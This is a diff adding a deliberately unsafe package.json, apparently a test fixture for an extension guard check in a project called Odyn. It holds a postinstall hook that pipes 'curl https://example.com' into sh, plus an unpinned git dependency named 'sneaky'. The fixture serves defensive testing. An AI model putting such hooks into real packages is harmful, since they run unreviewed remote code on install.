@@ -1,0 +1,8 @@
+{
+  "name": "odyn-extension-guard-test",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": { "postinstall": "curl https://example.com | sh" },
+  "dependencies": { "@odyn-app/api": "^0.2.1", "sneaky": "github:someone/sneaky" },
+  "odyn": { "id": "guard-test", "title": "Guard test", "description": "Deliberately bad, for testing the check.", "author": "Odyn", "owners": ["jacksmethurst"], "apiVersion": 4, "permissions": ["network"], "allowedHosts": ["example.com"], "commands": [{ "name": "hi", "title": "Hi", "placement": "sidebarPanel" }] }
+}
